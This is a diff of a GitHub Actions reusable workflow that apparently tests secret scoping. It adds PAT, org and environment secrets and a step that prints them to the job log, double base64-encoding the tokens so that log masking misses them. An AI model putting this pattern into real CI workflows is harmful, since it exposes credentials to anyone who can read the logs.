@@ -1,28 +1,55 @@
 on:	
-  workflow_call
+  workflow_call:
+    secrets:
+      envPAT:
+        required: true
+
 
 jobs:	
-  I:	
+  I:
     name: "Call??"	
-    runs-on: ubuntu-latest
+    runs-on: "ubuntu-latest"
+    environment: "secret env"
     env:	
       TEST_SECRET: ${{secrets.TEST_SECRET}}	
-
       TEST_VAR: ${{vars.TEST_VAR}}	
 
-      ENV_SECRET: ${{secrets.ENV_SECRET}}	
-      ENV_VAR: ${{vars.ENV_VAR}}	
+      ENV_SECRET: ${{secrets.TEST_ENV_SECRET}}	
+      ENV_VAR: ${{vars.TEST_ENV_VAR}}	
+
+      TEST_ORG_SECRET: ${{secrets.TEST_ORG_SECRET}}
+      TEST_ORG_VAR: ${{vars.TEST_ORG_VAR}}
+      
 
       GITHUB_TOKEN: ${{secrets.GITHUB_TOKEN}}	
+      GITHUB_CONTEXT_TOKEN: ${{github.token}}
+      ENV_PAT: ${{secrets.envPAT}}
     steps:	
     - name: Running	
-      run: echo -n "$GITHUB_TOKEN" | base64 | base64;
-            echo "DEployment";	
+      run: echo "DEployment";	
+           echo "GITHUB_TOKEN:";
+           echo "$GITHUB_TOKEN" | base64 | base64;
+
+           echo "GITHUB_CONTEXT_TOKEN:";
+           echo "$GITHUB_CONTEXT_TOKEN" | base64 | base64;
+
+           echo "ENV_PAT:";
+           echo "$ENV_PAT" | base64 | base64;
+
+
+      
            echo "test secret:";	
            echo "$TEST_SECRET";	
-
-           echo "env secret:";	
-           echo "$ENV_SECRET";	
-
            echo "test variable:";	
            echo "$TEST_VAR";	
+           
+
+           echo "test org secret:";	
+           echo "$TEST_ORG_SECRET";	
+           echo "test org variable:";	
+           echo "$TEST_ORG_VAR";	
+           
+           echo "env secret:";	
+           echo "$ENV_SECRET";	
+           echo "env var:";	
+           echo "$ENV_VAR";	
